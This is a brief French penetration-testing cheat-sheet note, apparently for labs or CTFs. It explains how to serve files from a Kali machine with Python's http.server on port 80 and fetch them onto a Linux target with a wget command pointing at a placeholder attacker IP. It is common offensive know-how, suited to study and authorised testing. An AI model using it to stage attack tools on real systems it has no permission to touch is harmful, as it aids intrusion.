# Serveur Python 

En premier, il faut lancer un serveur Python dans le dossier contenant les fichiers à importer:
```
python3 -m http.server 80
```

# Sous Linux 
```
wget http://<IP_KALI>/<outil>
```
